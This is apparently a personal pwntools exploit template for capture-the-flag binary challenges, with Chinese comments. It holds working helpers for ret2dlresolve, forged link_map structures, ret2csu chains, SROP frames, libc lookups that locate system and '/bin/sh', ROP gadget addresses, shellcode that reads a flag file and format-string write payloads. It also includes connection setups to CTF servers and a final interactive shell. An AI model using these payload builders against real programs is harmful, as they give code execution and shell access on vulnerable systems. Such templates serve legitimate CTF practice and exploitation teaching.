from pwn import *
from LibcSearcher import *
from pwnlib.dynelf import ctypes
from pwnlib.fmtstr import make_atoms_simple
from ctypes import *

context(arch="amd64", os="linux", log_level="debug")
# context(arch="amd64",os="linux",log_level="debug")
binary = "../"
libc = "../Libcs/libc.so.6_3"

rop = ROP(binary)
elf = ELF(binary)

libcElf = ELF(libc)
libcDll = cdll.LoadLibrary(libc)

libcDll.srand(1)

local = 0

ip, port = "61.147.171.105", 29144
# ip, port = "chall.pwnable.tw" 1
if local == 0:
    p = process(binary)
else:
    # p = remote(ip, port)
    # p = remote("pwn.challenge.ctf.show",port)
    p = remote("node5.buuoj.cn", port)

next = b"ls && cat flag"

ls = lambda addr: log.success(hex(addr))
# ===============   libc  ===============#
system_libc = libcElf.symbols["system"]
binsh_libc = libcElf.search(b"/bin/sh").__next__()
write_libc = libcElf.symbols["write"]
read_libc = libcElf.symbols["read"]

# ===============plt & got===============#
# putsPlt = elf.plt["puts"]
# putsGot = elf.got["puts"]
# writePlt = elf.plt["write"]
# writeGot = elf.got["write"]
# printfPlt = elf.plt["printf"]
# printfGot = elf.got["printf"]
# readPlt = elf.plt["read"]
# readGot = elf.got["read"]
# mainGot = elf.got["__libc_start_main"]
mprotectPlt = 0x440520


# print(hex(writePlt))
# print(hex(writeGot))


def ret2dlresolve_x64(elf, store_addr, func_name, resolve_addr):
    plt0 = elf.get_section_by_name(".plt").header.sh_addr

    rel_plt = elf.get_section_by_name(".rela.plt").header.sh_addr
    relaent = elf.dynamic_value_by_tag("DT_RELAENT")  # reloc entry size

    dynsym = elf.get_section_by_name(".dynsym").header.sh_addr
    syment = elf.dynamic_value_by_tag("DT_SYMENT")  # symbol entry size

    dynstr = elf.get_section_by_name(".dynstr").header.sh_addr

    # construct fake function string
    func_string_addr = store_addr
    resolve_data = func_name + "\x00"

    # construct fake symbol
    symbol_addr = store_addr + len(resolve_data)
    offset = symbol_addr - dynsym
    pad = syment - offset % syment  # align syment size
    symbol_addr = symbol_addr + pad
    symbol = (
        p32(func_string_addr - dynstr) + p8(0x12) + p8(0) + p16(0) + p64(0) + p64(0)
    )
    symbol_index = (symbol_addr - dynsym) / 24
    resolve_data += "a" * pad
    resolve_data += symbol

    # construct fake reloc
    reloc_addr = store_addr + len(resolve_data)
    offset = reloc_addr - rel_plt
    pad = relaent - offset % relaent  # align relaent size
    reloc_addr += pad
    reloc_index = (reloc_addr - rel_plt) / 24
    rinfo = (symbol_index << 32) | 7
    write_reloc = p64(resolve_addr) + p64(rinfo) + p64(0)
    resolve_data += "a" * pad
    resolve_data += write_reloc

    resolve_call = p64(plt0) + p64(reloc_index)
    return resolve_data, resolve_call


def fake_Linkmap_payload(fake_linkmap_addr, known_func_ptr, offset):
    # &(2**64-1)是因为offset为负数，如果不控制范围，p64后会越界，发生错误
    linkmap = p64(offset & (2**64 - 1))  # l_addr

    # fake_linkmap_addr + 8，也就是DT_JMPREL，至于为什么有个0，可以参考IDA上.dyamisc的结构内容

    linkmap += p64(0)  # 可以为任意值
    linkmap += p64(fake_linkmap_addr + 0x18)  # 这里的值就是伪造的.rel.plt的地址

    # fake_linkmap_addr + 0x18,fake_rel_write,因为write函数push的索引是0，也就是第一项
    linkmap += p64((fake_linkmap_addr + 0x30 - offset) & (2**64 - 1))
    # Rela->r_offset,正常情况下这里应该存的是got表对应条目的地址，解析完成后在这个地址上存放函数的实际地址，此处我们只需要设置一个可读写的地址即可
    linkmap += p64(
        0x7
    )  # Rela->r_info,用于索引symtab上的对应项，7>>32=0，也就是指向symtab的第一项
    linkmap += p64(0)  # Rela->r_addend,任意值都行

    linkmap += p64(0)  # l_ns

    # fake_linkmap_addr + 0x38, DT_SYMTAB
    linkmap += p64(0)  # 参考IDA上.dyamisc的结构
    linkmap += p64(
        known_func_ptr - 0x8
    )  # 这里的值就是伪造的symtab的地址,为已解析函数的got表地址-0x8

    linkmap += b"/bin/sh\x00"
    linkmap = linkmap.ljust(0x68, b"A")
    linkmap += p64(fake_linkmap_addr)
    # fake_linkmap_addr + 0x68, 对应的值的是DT_STRTAB的地址，由于我们用不到strtab，所以随意设置了一个可读区域
    linkmap += p64(fake_linkmap_addr + 0x38)
    # fake_linkmap_addr + 0x70 , 对应的值是DT_SYMTAB的地址
    linkmap = linkmap.ljust(0xF8, b"A")
    linkmap += p64(fake_linkmap_addr + 0x8)
    # fake_linkmap_addr + 0xf8, 对应的值是DT_JMPREL的地址
    return linkmap


"""
plt0    = elf.get_section_by_name('.plt').header.sh_addr        # 0x80483e0
relPlt  = elf.get_section_by_name('.rel.plt').header.sh_addr    # 0x8048390
dynsym   = elf.get_section_by_name('.dynsym').header.sh_addr     # 0x80481cc
dynstr   = elf.get_section_by_name('.dynstr').header.sh_addr     # 0x804828c
bssAddr = elf.get_section_by_name('.bss').header.sh_addr        # 0x804a028
baseAddr = bssAddr + 0x600    # 0x804a628
"""
# ==================rop==================#
# mainAddr = elf.symbols["main"]  # 32 bits not allowed
vulnAddr = 0x4004F1
# mainAddr = 0x8048484
# extAddr = elf.symbols["exit"]
# print(hex(extAddr))
retAddr = 0x00000000004003A9
levretAddr = 0x0000000000400A73

# bdrAddr = 0x804862B
# bdrAddr = elf.symbols["backdoor"] #32 bits not allowed
bdrAddr = 0x4004D7

rdiAddr = 0x00000000004005A3
# pop rdi;ret
rsiAddr = 0x00000000004005A1
# pop rsi;pop r15;ret
raxAddr = 0x00000000004004E3
rbpAddr = 0x00000000004004EB
# syscallAddr = 0x00000000004004fe
syscall_retAddr = 0x0000000000400517
lev_retAddr = 0x0000000000400537

hntAddr = 0x804831A  # bin/sh

# sysAddr = elf.plt["system"]
# 0x000000000049ef78 : mov rdi, rsp ; call rbp
rsp_rdiAddr = 0x49EF78
# 0x00000000004004d1 : pop rbp ; ret
rbpAddr = 0x4004D1
sysAddr = 0x4004E2

csuStart = 0x400580
csuEnd = 0x40059A

# ===============shellcode===============#
# shellcode = asm(shellcraft.sh())
# shellcode = asm(shellcraft.cat('flag'))
shell = shellcraft.open("./flag")
shell += shellcraft.read("eax", "esp", 100)
shell += shellcraft.write(1, "esp", 100)
# orw
# shellcode = asm(shell)
# shellcode = b'\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'
# 21 bits
# payload = shellcode;

# =============format string=============#
strAddr = 0x80486F8
# fmtStr = b"%11$n"
# fmtStr = b"%6$lx|"
fmtStr = b"%13$n"
fmtStr = b"%18$n|"
# fmtStr = b"|%31$08x|"
# fmtStr = b"%11$lx|"
# 16 -> 10
# offset 8 25
# 0x400000
# payload=fmtstr_payload(7,{printf_got:system_plt})
# payload = fmtstr_payload(8, {printf_got: sys}, write_size="byte", numbwritten=0xA)

# =================heap =================#

mainArenaOffset = 0x3C4B20
OffsetUnsortedbinArena = 88

# ======== __do_global_dtors_aux ========#
add_dword_rbp_0x3d_ebx_ret = 0x0040112C
# 0: 01 5d c3  add    DWORD PTR [rbp-0x3d], ebx
# ================= rsa =================#
N = 94576960329497431
"""
pp = 261571747
q = 361571773
phi = (pp-1)*(q-1)
d = 26375682325297625
"""


def powmod(a, b, m):
    if a == 0:
        return 0
    if b == 0:
        return 1
    res = powmod(a, b // 2, m)
    res *= res
    res %= m
    if b & 1:
        res *= a
        res %= m
    return res


def ans(sh):
    sh.recvuntil("it\n")
    for _ in range(20):
        c = int(sh.recvline())
        m = powmod(c, d, N)
        sh.sendline(str(m))
        sh.recvline()


# =================func =================#
def search(funcName: str, funcAddr: int):
    log.success(funcName + ": " + hex(funcAddr))
    libc = LibcSearcher(funcName, funcAddr)
    offset = funcAddr - libc.dump(funcName)
    binsh = offset + libc.dump("str_bin_sh")
    system = offset + libc.dump("system")
    log.success("system: " + hex(system))
    log.success("binsh: " + hex(binsh))
    return (system, binsh)


def searchFromLibc(funcName: str, funcAddr: int, libc=libcElf):
    log.success(funcName + ": " + hex(funcAddr))
    offset = funcAddr - libc.symbols[funcName]
    binsh = offset + libc.search(b"/bin/sh").__next__()
    system = offset + libc.symbols["system"]
    log.success("system: " + hex(system))
    log.success("binsh: " + hex(binsh))
    return (system, binsh)


# __libc_start_main


def csu(edi=0, rsi=0, rdx=0, r12=0, start=csuStart):
    end = start + 0x1A
    payload = p64(end)
    payload += p64(0)  # rbx
    payload += p64(1)  # rbp
    payload += p64(r12)  # r12
    payload += p64(edi)  # edi
    payload += p64(rsi)  # rsi
    payload += p64(rdx)  # rdx
    payload += p64(start)
    payload += b"a" * 56
    return payload


def sig(rax=0, rdi=0, rsi=0, rdx=0, rsp=0, rip=0):
    sigframe = SigreturnFrame()
    sigframe.rax = rax
    sigframe.rdi = rdi  # "/bin/sh" 's addr
    sigframe.rsi = rsi
    sigframe.rdx = rdx
    sigframe.rsp = rsp
    sigframe.rip = rip
    return bytes(sigframe)


# =================start=================#
# gdb.attach(p)
payload = b""
p.sendline(payload)

"""
for i in range(0, len(canary), 2):
    tmp = u32(canary[i:i+2].ljust(4, b'\0'))
    sCanary += chr(tmp)
log.success(sCanary)
"""
# ================round 2================#

# ================= End =================#
# p.sendline(next)
p.interactive()
